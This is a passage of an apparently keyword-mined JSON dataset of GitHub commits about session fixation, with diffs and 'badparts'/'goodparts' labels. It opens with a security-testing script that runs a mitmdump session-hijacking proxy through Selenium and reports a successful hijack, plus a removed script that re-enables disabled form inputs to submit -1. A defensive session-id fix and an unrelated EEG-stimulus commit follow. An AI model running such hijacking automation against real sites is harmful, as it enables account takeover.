webdriver.Firefox(firefox_profile=profile)\n+    subprocess.Popen([\"nohup\", \"mitmdump\", \"-s\", \"mitm_scripts\/mitm_session_hijacking.py\"])\n+    time.sleep(1)\n+    wd.get(self.link)\n+    wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"account\"] + \"']\").send_keys(self.form_parameter[\"account_value\"])\n+    wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"password\"] + \"']\").send_keys(self.form_parameter[\"password_value\"])\n+    wd.find_element_by_xpath(\"\/\/input[@value='\" + self.button + \"']\").click()\n+    print \"CONFIRMED: session hijacking attack successful.\"\n+    subprocess.Popen(\"kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')\", shell=True)\n+    subprocess.Popen(\"rm nohup.out\", shell=True)\n+    subprocess.Popen(\"rm tmp_cookie.txt\", shell=True)\n+    wd.close()\n \n-    wd.get(self.link[0])\n-    wd.find_element_by_css_selector(\"input[name=\" + self.form_parameter[0][\"account\"] + \"]\").send_keys(self.form_parameter[0][\"account_value\"])\n-    wd.find_element_by_css_selector(\"input[name=\" + self.form_parameter[0][\"password\"] + \"]\").send_keys(self.form_parameter[0][\"password_value\"])\n-    wd.find_element_by_css_selector(\"input[value=\" + self.button[0] + \"]\").click()\n-    fixed_cookie = \"\"\n-    for cookie in wd.get_cookies():\n-        if cookie[\"name\"] == self.cookie[0][\"name\"]:\n-            fixed_cookie = cookie[\"value\"]\n-            break\n-    print fixed_cookie\n-\n-    WebDriverWait(wd, 10).until(\n-        EC.presence_of_element_located((By.ID, \"myDynamicElement\"))\n-    )\n+    def phase4_output(self, source):\n+        try:\n+            if os.stat(\"phase4output.json\").st_size > 0:\n+                with open('phase4output.json') as f:\n+                    data = json.load(f)\n+                data.append(source)\n+                with open('phase4output.json', 'w') as f:\n+                    json.dump(data, f)\n+            else:\n+                with open('phase4output.json', 'w') as f:\n+                    json.dump([source], f)\n+        except OSError:\n+            with open('phase4output.json', 'w+') as f:\n+                json.dump([source], f)\n","message":"","files":{"\/App1\/automation.py":{"changes":[{"diff":"\n-from selenium import webdriver\n-url = \"http:\/\/app1.com\"\n-wd = webdriver.Chrome()\n-\n-wd.get(url)\n-\n-# enable input and submit button\n-wd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")\n-wd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")\n-\n-# fill in -1 value in input and submit\n-wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)\n-wd.find_element_by_css_selector(\"form\").submit()","add":0,"remove":13,"filename":"\/App1\/automation.py","badparts":["from selenium import webdriver","url = \"http:\/\/app1.com\"","wd = webdriver.Chrome()","wd.get(url)","wd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")","wd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")","wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)","wd.find_element_by_css_selector(\"form\").submit()"],"goodparts":[]},{"diff":"\n-from selenium import webdriver\n-url = \"http:\/\/app1.com\"\n-wd = webdriver.Chrome()\n-\n-wd.get(url)\n-\n-# enable input and submit button\n-wd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")\n-wd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")\n-\n-# fill in -1 value in input and submit\n-wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)\n-wd.find_element_by_css_selector(\"form\").submit()","add":0,"remove":13,"filename":"\/App1\/automation.py","badparts":["from selenium import webdriver","url = \"http:\/\/app1.com\"","wd = webdriver.Chrome()","wd.get(url)","wd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")","wd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")","wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)","wd.find_element_by_css_selector(\"form\").submit()"],"goodparts":[]}],"source":"\nfrom selenium import webdriver url=\"http:\/\/app1.com\" wd=webdriver.Chrome() wd.get(url) wd.execute_script(\"document.getElementsByTagName('input')[0].disabled=false\") wd.execute_script(\"document.getElementsByTagName('input')[1].disabled=false\") wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1) wd.find_element_by_css_selector(\"form\").submit() ","sourceWithComments":"from selenium import webdriver\nurl = \"http:\/\/app1.com\"\nwd = webdriver.Chrome()\n\nwd.get(url)\n\n# enable input and submit button\nwd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")\nwd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")\n\n# fill in -1 value in input and submit\nwd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)\nwd.find_element_by_css_selector(\"form\").submit()\n"}},"msg":"update session_fixation automation"}},"https:\/\/github.com\/usingnamespace\/pyramid_pluggable_session":{"27dcea599b6307878bf904c736b83a875fa4e9f2":{"url":"https:\/\/api.github.com\/repos\/usingnamespace\/pyramid_pluggable_session\/commits\/27dcea599b6307878bf904c736b83a875fa4e9f2","html_url":"https:\/\/github.com\/usingnamespace\/pyramid_pluggable_session\/commit\/27dcea599b6307878bf904c736b83a875fa4e9f2","message":"Add more cases where we regenerate the session id\n\nIn an attempt to stop session fixation attacks, we want to make sure we\ndon't reuse the same session ID after it has expired, or the backend\ndata failed to to unpack\/deserialize.","sha":"27dcea599b6307878bf904c736b83a875fa4e9f2","keyword":"session fixation attack","diff":"diff --git a\/pyramid_pluggable_session\/__init__.py b\/pyramid_pluggable_session\/__init__.py\nindex a2b16cc..b2e0264 100644\n--- a\/pyramid_pluggable_session\/__init__.py\n+++ b\/pyramid_pluggable_session\/__init__.py\n@@ -204,6 +204,7 @@ def __init__(self, request):\n                     value = None\n                     # Cleanup the session, since it failed to deserialize\n                     plug.clear(self, request)\n+                    self._session_id = None\n \n             if value is not None:\n                 try:\n@@ -218,6 +219,7 @@ def __init__(self, request):\n                     state = {}\n                     # Clean up the session since it failed to unpack\n                     plug.clear(self, request)\n+                    self._session_id = None\n \n             if self._timeout is not None:\n                 if now - renewed > self._timeout:\n@@ -226,9 +228,11 @@ def __init__(self, request):\n                     state = {}\n                     # Session expired, cleanup this session\n                     plug.clear(self, request)\n+                    self._session_id = None\n \n+            # Generate a new session id\n             if self._session_id is None:\n-                self._session_id = text_(binascii.hexlify(os.urandom(20)))\n+                self._generate_new_id()\n \n             self.created = created\n             self.accessed = renewed\n@@ -324,6 +328,9 @@ def _save_session(self, response):\n \n             return True\n \n+        def _generate_new_id(self):\n+            self._session_id = text_(binascii.hexlify(os.urandom(20)))\n+\n     return PluggableSession\n \n \n","files":{"\/pyramid_pluggable_session\/__init__.py":{"changes":[{"diff":"\n                     state = {}\n                     # Session expired, cleanup this session\n                     plug.clear(self, request)\n+                    self._session_id = None\n \n+            # Generate a new session id\n             if self._session_id is None:\n-                self._session_id = text_(binascii.hexlify(os.urandom(20)))\n+                self._generate_new_id()\n \n             self.created = created\n             self.accessed = renewed\n","add":3,"remove":1,"filename":"\/pyramid_pluggable_session\/__init__.py","badparts":["                self._session_id = text_(binascii.hexlify(os.urandom(20)))"],"goodparts":["                    self._session_id = None","                self._generate_new_id()"]},{"diff":"\n                     state = {}\n                     # Session expired, cleanup this session\n                     plug.clear(self, request)\n+                    self._session_id = None\n \n+            # Generate a new session id\n             if self._session_id is None:\n-                self._session_id = text_(binascii.hexlify(os.urandom(20)))\n+                self._generate_new_id()\n \n             self.created = created\n             self.accessed = renewed\n","add":3,"remove":1,"filename":"\/pyramid_pluggable_session\/__init__.py","badparts":["                self._session_id = text_(binascii.hexlify(os.urandom(20)))"],"goodparts":["                    self._session_id = None","                self._generate_new_id()"]}],"source":"\nimport base64 import binascii import hashlib import hmac import os import time from webob.cookies import( SignedCookieProfile as CookieHelper, SignedSerializer, ) from zope.interface import implementer from pyramid.interfaces import ISession from pyramid.settings import( asbool, aslist, ) from pyramid.session import( manage_accessed, manage_changed, PickleSerializer, ) from pyramid.compat import( PY3, text_, bytes_, native_, ) from.interfaces import IPlugSession def PluggableSessionFactory( secret, cookie_name='session', max_age=None, path='\/', domain=None, secure=False, httponly=False, set_on_exception=True, timeout=1200, reissue_time=0, hashalg='sha512', salt='pyramid_pluggable_session.', serializer=None, ): \"\"\" .. versionadded:: 1.5 Configure a:term:`session factory` which will provide signed cookie-based sessions. The return value of this function is a:term:`session factory`, which may be provided as the ``session_factory`` argument of a :class:`pyramid.config.Configurator` constructor, or used as the ``session_factory`` argument of the :meth:`pyramid.config.Configurator.set_session_factory` method. The session factory returned by this function will create sessions which are limited to storing fewer than 4000 bytes of data(as the payload must fit into a single cookie). Parameters: ``secret`` A string which is used to sign the cookie. The secret should be at least as long as the block size of the selected hash algorithm. For ``sha512`` this would mean a 128 bit(64 character) secret. It should be unique within the set of secret values provided to Pyramid for its various subsystems(see:ref:`admonishment_against_secret_sharing`). ``hashalg`` The HMAC digest algorithm to use for signing. The algorithm must be supported by the:mod:`hashlib` library. Default: ``'sha512'``. ``salt`` A namespace to avoid collisions between different uses of a shared secret. Reusing a secret for different parts of an application is strongly discouraged(see:ref:`admonishment_against_secret_sharing`). Default: ``'pyramid.session.'``. ``cookie_name`` The name of the cookie used for sessioning. Default: ``'session'``. ``max_age`` The maximum age of the cookie used for sessioning(in seconds). Default: ``None``(browser scope). ``path`` The path used for the session cookie. Default: ``'\/'``. ``domain`` The domain used for the session cookie. Default: ``None``(no domain). ``secure`` The 'secure' flag of the session cookie. Default: ``False``. ``httponly`` Hide the cookie from Javascript by setting the 'HttpOnly' flag of the session cookie. Default: ``False``. ``timeout`` A number of seconds of inactivity before a session times out. If ``None`` then the cookie never expires. This lifetime only applies to the *value* within the cookie. Meaning that if the cookie expires due to a lower ``max_age``, then this setting has no effect. Default: ``1200``. ``reissue_time`` The number of seconds that must pass before the cookie is automatically reissued as the result of accessing the session. The duration is measured as the number of seconds since the last session cookie was issued and 'now'. If this value is ``0``, a new cookie will be reissued on every request accessing the session. If ``None`` then the cookie's lifetime will never be extended. A good rule of thumb: if you want auto-expired cookies based on inactivity: set the ``timeout`` value to 1200(20 mins) and set the ``reissue_time`` value to perhaps a tenth of the ``timeout`` value (120 or 2 mins). It's nonsensical to set the ``timeout`` value lower than the ``reissue_time`` value, as the ticket will never be reissued. However, such a configuration is not explicitly prevented. Default: ``0``. ``set_on_exception`` If ``True``, set a session cookie even if an exception occurs while rendering a view. Default: ``True``. ``serializer`` An object with two methods: ``loads`` and ``dumps``. The ``loads`` method should accept bytes and return a Python object. The ``dumps`` method should accept a Python object and return bytes. A ``ValueError`` should be raised for malformed inputs. If a serializer is not passed, the:class:`pyramid.session.PickleSerializer` serializer will be used. \"\"\" if serializer is None: serializer=PickleSerializer() signed_serializer=SignedSerializer( secret +'_internal_use', salt +'_internal_use', hashalg, serializer=serializer, ) serializer=signed_serializer @implementer(ISession) class PluggableSession(dict): \"\"\" Dictionary-like session object \"\"\" _cookie_on_exception=set_on_exception _timeout=timeout _reissue_time=reissue_time _dirty=False def __init__(self, request): self._cookie=CookieHelper( secret, salt, cookie_name, secure=secure, max_age=max_age, httponly=httponly, path=path, domains=domain, hashalg=hashalg, ) self._session_id=None self.request=request reg=request.registry plug=reg.queryUtility(IPlugSession) if plug is None: raise RuntimeError('Unable to find any registered IPlugSession') now=time.time() created=renewed=now new=True value=None state={} self._session_id=self._cookie.bind(request).get_value() if self._session_id is not None: try: sess_val=plug.loads(self, request) value=serializer.loads(bytes_(sess_val)) except ValueError: value=None plug.clear(self, request) if value is not None: try: rval, cval, sval=value renewed=float(rval) created=float(cval) state=sval new=False except(TypeError, ValueError): state={} plug.clear(self, request) if self._timeout is not None: if now -renewed > self._timeout: state={} plug.clear(self, request) if self._session_id is None: self._session_id=text_(binascii.hexlify(os.urandom(20))) self.created=created self.accessed=renewed self.renewed=renewed self.new=new self._plug=plug dict.__init__(self, state) def changed(self): if not self._dirty: self._dirty=True def save_session_callback(request, response): self._save_session(response) self.request=None self.request.add_response_callback(save_session_callback) def invalidate(self): self._plug.clear(self, self.request) self.clear() get=manage_accessed(dict.get) __getitem__=manage_accessed(dict.__getitem__) items=manage_accessed(dict.items) values=manage_accessed(dict.values) keys=manage_accessed(dict.keys) __contains__=manage_accessed(dict.__contains__) __len__=manage_accessed(dict.__len__) __iter__=manage_accessed(dict.__iter__) if not PY3: iteritems=manage_accessed(dict.iteritems) itervalues=manage_accessed(dict.itervalues) iterkeys=manage_accessed(dict.iterkeys) has_key=manage_accessed(dict.has_key) clear=manage_changed(dict.clear) update=manage_changed(dict.update) setdefault=manage_changed(dict.setdefault) pop=manage_changed(dict.pop) popitem=manage_changed(dict.popitem) __setitem__=manage_changed(dict.__setitem__) __delitem__=manage_changed(dict.__delitem__) @manage_changed def flash(self, msg, queue='', allow_duplicate=True): storage=self.setdefault('_f_' +queue,[]) if allow_duplicate or(msg not in storage): storage.append(msg) @manage_changed def pop_flash(self, queue=''): storage=self.pop('_f_' +queue,[]) return storage @manage_accessed def peek_flash(self, queue=''): storage=self.get('_f_' +queue,[]) return storage @manage_changed def new_csrf_token(self): token=text_(binascii.hexlify(os.urandom(20))) self['_csrft_']=token return token @manage_accessed def get_csrf_token(self): token=self.get('_csrft_', None) if token is None: token=self.new_csrf_token() return token def _save_session(self, response): if not self._cookie_on_exception: exception=getattr(self.request, 'exception', None) if exception is not None: return False sess_val=native_( serializer.dumps( (self.accessed, self.created, dict(self)) ) ) self._plug.dumps(self, self.request, sess_val) self._cookie.set_cookies(response, self._session_id) return True return PluggableSession required_settings=[ 'secret', ] default_settings=[ ('cookie_name', str, 'session'), ('max_age', int, '864000'), ('path', str, '\/'), ('domain', aslist, ''), ('secure', asbool, 'false'), ('httponly', asbool, 'true'), ('set_on_exception', asbool, 'true'), ('timeout', int, '1200'), ('reissue_time', int, '0'), ('hashalg', str, 'sha512'), ('salt', str, 'pyramid_pluggable_session.'), ('serializer', str, ''), ] def parse_settings(settings): parsed={} def populate(name, convert, default): sname='%s%s' %('pluggable_session.', name) value=convert(settings.get(sname, default)) parsed[name]=value for name, convert, default in default_settings: populate(name, convert, default) return parsed def set_session_plug(config, dotted): \"\"\" Set the pluggable session that should be used... \"\"\" dotted=config.maybe_dotted(dotted) config.registry.registerUtility(dotted(config), IPlugSession) def includeme(config): for _required in required_settings: _required='pluggable_session.' +_required if not _required in config.registry.settings: raise ValueError(_required +' has to be set in config.settings') settings=parse_settings(config.registry.settings) if not settings['domain']: del settings['domain'] if not settings['serializer']: del settings['serializer'] else: settings['serializer']=config.maybe_dotted(settings['serializer']) _session_factory=PluggableSessionFactory( config.registry.settings['pluggable_session.secret'], **settings ) config.set_session_factory(_session_factory) config.add_directive('set_session_plug', set_session_plug) if 'pluggable_session.plug' in config.registry.settings: config.set_session_plug(config.registry.settings['pluggable_session.plug']) ","sourceWithComments":"import base64\nimport binascii\nimport hashlib\nimport hmac\nimport os\nimport time\n\nfrom webob.cookies import (\n        SignedCookieProfile as CookieHelper,\n        SignedSerializer,\n        )\n\nfrom zope.interface import implementer\nfrom pyramid.interfaces import ISession\n\nfrom pyramid.settings import (\n        asbool,\n        aslist,\n        )\n\nfrom pyramid.session import (\n    manage_accessed,\n    manage_changed,\n    PickleSerializer,\n    )\n\nfrom pyramid.compat import (\n    PY3,\n    text_,\n    bytes_,\n    native_,\n    )\n\nfrom .interfaces import IPlugSession\n\n# Most of this code was shamelessly lifted from pyramid\/session.py, all\n# original code is under the Pyramid LICENSE, modifications are under BSD\n\ndef PluggableSessionFactory(\n    secret,\n    cookie_name='session',\n    max_age=None,\n    path='\/',\n    domain=None,\n    secure=False,\n    httponly=False,\n    set_on_exception=True,\n    timeout=1200,\n    reissue_time=0,\n    hashalg='sha512',\n    salt='pyramid_pluggable_session.',\n    serializer=None,\n    ):\n    \"\"\"\n    .. versionadded:: 1.5\n\n    Configure a :term:`session factory` which will provide signed\n    cookie-based sessions.  The return value of this\n    function is a :term:`session factory`, which may be provided as\n    the ``session_factory`` argument of a\n    :class:`pyramid.config.Configurator` constructor, or used\n    as the ``session_factory`` argument of the\n    :meth:`pyramid.config.Configurator.set_session_factory`\n    method.\n\n    The session factory returned by this function will create sessions\n    which are limited to storing fewer than 4000 bytes of data (as the\n    payload must fit into a single cookie).\n\n    Parameters:\n\n    ``secret``\n      A string which is used to sign the cookie. The secret should be at\n      least as long as the block size of the selected hash algorithm. For\n      ``sha512`` this would mean a 128 bit (64 character) secret.  It should\n      be unique within the set of secret values provided to Pyramid for\n      its various subsystems (see :ref:`admonishment_against_secret_sharing`).\n\n    ``hashalg``\n      The HMAC digest algorithm to use for signing. The algorithm must be\n      supported by the :mod:`hashlib` library. Default: ``'sha512'``.\n\n    ``salt``\n      A namespace to avoid collisions between different uses of a shared\n      secret. Reusing a secret for different parts of an application is\n      strongly discouraged (see :ref:`admonishment_against_secret_sharing`).\n      Default: ``'pyramid.session.'``.\n\n    ``cookie_name``\n      The name of the cookie used for sessioning. Default: ``'session'``.\n\n    ``max_age``\n      The maximum age of the cookie used for sessioning (in seconds).\n      Default: ``None`` (browser scope).\n\n    ``path``\n      The path used for the session cookie. Default: ``'\/'``.\n\n    ``domain``\n      The domain used for the session cookie.  Default: ``None`` (no domain).\n\n    ``secure``\n      The 'secure' flag of the session cookie. Default: ``False``.\n\n    ``httponly``\n      Hide the cookie from Javascript by setting the 'HttpOnly' flag of the\n      session cookie. Default: ``False``.\n\n    ``timeout``\n      A number of seconds of inactivity before a session times out. If\n      ``None`` then the cookie never expires. This lifetime only applies\n      to the *value* within the cookie. Meaning that if the cookie expires\n      due to a lower ``max_age``, then this setting has no effect.\n      Default: ``1200``.\n\n    ``reissue_time``\n      The number of seconds that must pass before the cookie is automatically\n      reissued as the result of accessing the session. The\n      duration is measured as the number of seconds since the last session\n      cookie was issued and 'now'.  If this value is ``0``, a new cookie\n      will be reissued on every request accessing the session. If ``None``\n      then the cookie's lifetime will never be extended.\n\n      A good rule of thumb: if you want auto-expired cookies based on\n      inactivity: set the ``timeout`` value to 1200 (20 mins) and set the\n      ``reissue_time`` value to perhaps a tenth of the ``timeout`` value\n      (120 or 2 mins).  It's nonsensical to set the ``timeout`` value lower\n      than the ``reissue_time`` value, as the ticket will never be reissued.\n      However, such a configuration is not explicitly prevented.\n\n      Default: ``0``.\n\n    ``set_on_exception``\n      If ``True``, set a session cookie even if an exception occurs\n      while rendering a view. Default: ``True``.\n\n    ``serializer``\n      An object with two methods: ``loads`` and ``dumps``.  The ``loads``\n      method should accept bytes and return a Python object.  The ``dumps``\n      method should accept a Python object and return bytes.  A ``ValueError``\n      should be raised for malformed inputs.  If a serializer is not passed,\n      the :class:`pyramid.session.PickleSerializer` serializer will be used.\n    \"\"\"\n\n    if serializer is None:\n        serializer = PickleSerializer()\n\n    signed_serializer = SignedSerializer(\n            secret + '_internal_use',\n            salt + '_internal_use',\n            hashalg,\n            serializer=serializer,\n        )\n\n    serializer = signed_serializer\n\n    @implementer(ISession)\n    class PluggableSession(dict):\n        \"\"\" Dictionary-like session object \"\"\"\n\n        # configuration parameters\n        _cookie_on_exception = set_on_exception\n        _timeout = timeout\n        _reissue_time = reissue_time\n\n        # dirty flag\n        _dirty = False\n\n        def __init__(self, request):\n            self._cookie = CookieHelper(\n                secret,\n                salt,\n                cookie_name,\n                secure=secure,\n                max_age=max_age,\n                httponly=httponly,\n                path=path,\n                domains=domain,\n                hashalg=hashalg,\n            )\n            self._session_id = None\n            self.request = request\n\n            reg = request.registry\n            plug = reg.queryUtility(IPlugSession)\n\n            if plug is None:\n                raise RuntimeError('Unable to find any registered IPlugSession')\n\n            now = time.time()\n            created = renewed = now\n            new = True\n            value = None\n            state = {}\n\n            # Get the session_id\n            self._session_id = self._cookie.bind(request).get_value()\n\n            if self._session_id is not None:\n                try:\n                    sess_val = plug.loads(self, request)\n                    value = serializer.loads(bytes_(sess_val))\n                except ValueError:\n                    value = None\n                    # Cleanup the session, since it failed to deserialize\n                    plug.clear(self, request)\n\n            if value is not None:\n                try:\n                    rval, cval, sval = value\n                    renewed = float(rval)\n                    created = float(cval)\n                    state = sval\n                    new = False\n                except (TypeError, ValueError):\n                    # value failed to unpack properly or renewed was not\n                    # a numeric type so we'll fail deserialization here\n                    state = {}\n                    # Clean up the session since it failed to unpack\n                    plug.clear(self, request)\n\n            if self._timeout is not None:\n                if now - renewed > self._timeout:\n                    # expire the session because it was not renewed\n                    # before the timeout threshold\n                    state = {}\n                    # Session expired, cleanup this session\n                    plug.clear(self, request)\n\n            if self._session_id is None:\n                self._session_id = text_(binascii.hexlify(os.urandom(20)))\n\n            self.created = created\n            self.accessed = renewed\n            self.renewed = renewed\n            self.new = new\n            self._plug = plug\n            dict.__init__(self, state)\n\n        # ISession methods\n        def changed(self):\n            if not self._dirty:\n                self._dirty = True\n                def save_session_callback(request, response):\n                    self._save_session(response)\n                    self.request = None # explicitly break cycle for gc\n                self.request.add_response_callback(save_session_callback)\n\n        def invalidate(self):\n            self._plug.clear(self, self.request)\n            self.clear()\n\n        # non-modifying dictionary methods\n        get = manage_accessed(dict.get)\n        __getitem__ = manage_accessed(dict.__getitem__)\n        items = manage_accessed(dict.items)\n        values = manage_accessed(dict.values)\n        keys = manage_accessed(dict.keys)\n        __contains__ = manage_accessed(dict.__contains__)\n        __len__ = manage_accessed(dict.__len__)\n        __iter__ = manage_accessed(dict.__iter__)\n\n        if not PY3:\n            iteritems = manage_accessed(dict.iteritems)\n            itervalues = manage_accessed(dict.itervalues)\n            iterkeys = manage_accessed(dict.iterkeys)\n            has_key = manage_accessed(dict.has_key)\n\n        # modifying dictionary methods\n        clear = manage_changed(dict.clear)\n        update = manage_changed(dict.update)\n        setdefault = manage_changed(dict.setdefault)\n        pop = manage_changed(dict.pop)\n        popitem = manage_changed(dict.popitem)\n        __setitem__ = manage_changed(dict.__setitem__)\n        __delitem__ = manage_changed(dict.__delitem__)\n\n        # flash API methods\n        @manage_changed\n        def flash(self, msg, queue='', allow_duplicate=True):\n            storage = self.setdefault('_f_' + queue, [])\n            if allow_duplicate or (msg not in storage):\n                storage.append(msg)\n\n        @manage_changed\n        def pop_flash(self, queue=''):\n            storage = self.pop('_f_' + queue, [])\n            return storage\n\n        @manage_accessed\n        def peek_flash(self, queue=''):\n            storage = self.get('_f_' + queue, [])\n            return storage\n\n        # CSRF API methods\n        @manage_changed\n        def new_csrf_token(self):\n            token = text_(binascii.hexlify(os.urandom(20)))\n            self['_csrft_'] = token\n            return token\n\n        @manage_accessed\n        def get_csrf_token(self):\n            token = self.get('_csrft_', None)\n            if token is None:\n                token = self.new_csrf_token()\n            return token\n\n        # non-API methods\n        def _save_session(self, response):\n            if not self._cookie_on_exception:\n                exception = getattr(self.request, 'exception', None)\n                if exception is not None: # dont set a cookie during exceptions\n                    return False\n\n            sess_val = native_(\n                    serializer.dumps(\n                            (self.accessed, self.created, dict(self))\n                        )\n                    )\n\n            self._plug.dumps(self, self.request, sess_val)\n            self._cookie.set_cookies(response, self._session_id)\n\n            return True\n\n    return PluggableSession\n\n\nrequired_settings =  [\n        'secret',\n        ]\n\ndefault_settings = [\n    ('cookie_name', str, 'session'),\n    ('max_age', int, '864000'),\n    ('path', str, '\/'),\n    ('domain', aslist, ''),\n    ('secure', asbool, 'false'),\n    ('httponly', asbool, 'true'),\n    ('set_on_exception', asbool, 'true'),\n    ('timeout', int, '1200'),\n    ('reissue_time', int, '0'),\n    ('hashalg', str, 'sha512'),\n    ('salt', str, 'pyramid_pluggable_session.'),\n    ('serializer', str, ''),\n]\n\ndef parse_settings(settings):\n    parsed = {}\n\n    def populate(name, convert, default):\n        sname = '%s%s' % ('pluggable_session.', name)\n        value = convert(settings.get(sname, default))\n        parsed[name] = value\n\n    for name, convert, default in default_settings:\n        populate(name, convert, default)\n    return parsed\n\ndef set_session_plug(config, dotted):\n    \"\"\" Set the pluggable session that should be used...\n    \"\"\"\n\n    dotted = config.maybe_dotted(dotted)\n    config.registry.registerUtility(dotted(config), IPlugSession)\n\ndef includeme(config):\n    # We can't continue unless at least this is set...\n    for _required in required_settings:\n        _required = 'pluggable_session.' + _required\n        if not _required in config.registry.settings:\n            raise ValueError(_required +' has to be set in config.settings')\n\n    # Get all of the settings into a neat little dictionary\n    settings = parse_settings(config.registry.settings)\n\n    if not settings['domain']:\n        del settings['domain']\n\n    if not settings['serializer']:\n        del settings['serializer']\n    else:\n        settings['serializer'] = config.maybe_dotted(settings['serializer'])\n\n    _session_factory = PluggableSessionFactory(\n                config.registry.settings['pluggable_session.secret'],\n                **settings\n            )\n    config.set_session_factory(_session_factory)\n    config.add_directive('set_session_plug', set_session_plug)\n\n    if 'pluggable_session.plug' in config.registry.settings:\n        config.set_session_plug(config.registry.settings['pluggable_session.plug'])\n\n"}},"msg":"Add more cases where we regenerate the session id\n\nIn an attempt to stop session fixation attacks, we want to make sure we\ndon't reuse the same session ID after it has expired, or the backend\ndata failed to to unpack\/deserialize."}},"https:\/\/github.com\/CAMBI-tech\/BciPy":{"34887278308431aac991d8847066b676cff25115":{"url":"https:\/\/api.github.com\/repos\/CAMBI-tech\/BciPy\/commits\/34887278308431aac991d8847066b676cff25115","html_url":"https:\/\/github.com\/CAMBI-tech\/BciPy\/commit\/34887278308431aac991d8847066b676cff25115","message":"#181489190 ; updated stimuli labels in copy phrase session to ensure that fixation stimuli are labeled as 'fixation' rather than 'nontarget'","sha":"34887278308431aac991d8847066b676cff25115","keyword":"session fixation update","diff":"diff --git a\/bcipy\/helpers\/task.py b\/bcipy\/helpers\/task.py\nindex 33aae84f..31be263f 100644\n--- a\/bcipy\/helpers\/task.py\n+++ b\/bcipy\/helpers\/task.py\n@@ -1,16 +1,16 @@\n import logging\n import os\n import random\n-\n from string import ascii_uppercase\n from typing import Any, List, Tuple, Union\n \n-from bcipy.helpers.clock import Clock\n-from bcipy.task.exceptions import InsufficientDataException\n-\n import numpy as np\n from psychopy import core, event, visual\n \n+from bcipy.helpers.clock import Clock\n+from bcipy.helpers.stimuli import get_fixation\n+from bcipy.task.exceptions import InsufficientDataException\n+\n log = logging.getLogger(__name__)\n \n SPACE_CHAR = '_'\n@@ -125,24 +125,23 @@ def construct_triggers(inquiry_timing: List[List]) -> List[Tuple[str, float]]:\n \n \n def target_info(triggers: List[Tuple[str, float]],\n-                target_letter: str = None) -> List[str]:\n+                target_letter: str = None,\n+                is_txt: bool = True) -> List[str]:\n     \"\"\"Targetness for each item in triggers.\n \n     Parameters\n     ----------\n     - triggers : list of (stim, offset)\n     - target_letter : letter the user is attempting to spell\n+    - is_txt : bool indicating whether the triggers are text stimuli\n \n     Returns\n     -------\n     list of ('target' | 'nontarget') for each trigger.\n     \"\"\"\n-    if target_letter:\n-        return [\n-            'target' if trg[0] == target_letter else 'nontarget'\n-            for trg in triggers\n-        ]\n-    return ['nontarget'] * len(triggers)\n+    fixation = get_fixation(is_txt)\n+    labels = {target_letter: 'target', fixation: 'fixation'}\n+    return [labels.get(trg[0], 'nontarget') for trg in triggers]\n \n \n def get_data_for_decision(inquiry_timing,\ndiff --git a\/bcipy\/helpers\/tests\/test_task.py b\/bcipy\/helpers\/tests\/test_task.py\nindex e63de17c..328ef40d 100644\n--- a\/bcipy\/helpers\/tests\/test_task.py\n+++ b\/bcipy\/helpers\/tests\/test_task.py\n@@ -211,14 +211,14 @@ def test_target_info(self):\n                     ('X', 1.9859995969745796), ('Y', 2.203130029985914),\n                     ('W', 2.4198898100003134)]\n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'target', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ]\n         self.assertEqual(expected, target_info(triggers, target_letter='Z'))\n \n         expected = [\n-            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n+            'fixation', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n             'nontarget'\n         ]\ndiff --git a\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py b\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py\nindex 02c7e157..13106b6d 100644\n--- a\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py\n+++ b\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py\n@@ -542,7 +542,7 @@ def new_data_record(self,\n                         target_stimuli: str,\n                         current_text: str,\n                         decision: Decision,\n-                        evidence_types: List[EvidenceType] = []) -> Inquiry:\n+                        evidence_types: List[EvidenceType] = None) -> Inquiry:\n         \"\"\"Construct a new inquiry data record.\n \n         Parameters\n@@ -560,11 +560,13 @@ def new_data_record(self,\n         evidence for the provided evidence_types, leaving the other types empty\n         \"\"\"\n         assert self.current_inquiry, \"Current inquiry is required\"\n+        evidence_types = evidence_types or []\n         triggers = construct_triggers(self.stims_for_decision(stim_times))\n         data = Inquiry(stimuli=self.current_inquiry.stimuli,\n                        timing=self.current_inquiry.durations,\n                        triggers=triggers,\n-                       target_info=target_info(triggers, target_stimuli),\n+                       target_info=target_info(triggers, target_stimuli,\n+                                               self.parameters['is_txt_stim']),\n                        target_letter=target_stimuli,\n                        current_text=current_text,\n                        target_text=self.copy_phrase,\n","files":{"\/bcipy\/helpers\/task.py":{"changes":[{"diff":"\n import logging\n import os\n import random\n-\n from string import ascii_uppercase\n from typing import Any, List, Tuple, Union\n \n-from bcipy.helpers.clock import Clock\n-from bcipy.task.exceptions import InsufficientDataException\n-\n import numpy as np\n from psychopy import core, event, visual\n \n+from bcipy.helpers.clock import Clock\n+from bcipy.helpers.stimuli import get_fixation\n+from bcipy.task.exceptions import InsufficientDataException\n+\n log = logging.getLogger(__name__)\n \n SPACE_CHAR = 